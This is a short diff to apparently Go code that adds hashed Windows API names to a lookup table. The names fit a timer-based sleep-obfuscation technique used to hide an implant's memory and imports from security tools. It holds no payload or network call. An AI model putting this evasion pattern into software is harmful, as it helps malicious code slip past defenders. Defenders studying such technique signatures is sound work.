@@ -159,4 +159,20 @@ var ApiNameHashes = []uint64{
 	0x71DEA6CC38F7CD4F, //GetLocalTime
 	0x1261F2B90D585BD0, //GetSystemTimeAsFileTime
 	0x9774D5E616F6E65D, //GetSystemMetrics
+	0x833DC9DAFB63D357, //RtlCreateTimerQueue
+	0xED3C945CBD30E659, //NtCreateEvent
+	0xC51DBF692B44F360, //RtlCaptureContext
+	0xDB1E978CBD30E657, //RtlCreateTimer
+	0x6A1D8DC13D39EA44, //RtlRegisterWait
+	0x833E0AB7BBE3D357, //RtlDeleteTimerQueue
+	0x6C2F0C759B1FDAA3, //RtlCopyMappedMemory
+	0x1316841BB3E02BB2, //NtWaitForSingleObject
+	0xDEDEBF4CA2AFD250, //NtSignalAndWaitForSingleObject
+	0xEBBB4F4DDBE1F501, //NtContinue
+	0xDD97B45E9969F510, //NtSetEvent
+	0x7F13D5240731024E, //NtSetContextThread
+	0x6EFE64DB33C8623C, //NtDuplicateObject
+	0x9B2E41BE54366260, //VirtualProtect 43
+	0x8231D59A3A04EF1D, //SystemFunction032 44
+	0x38B9B8DA106ECFF9, //WaitForSingleObjectEx 45
 }
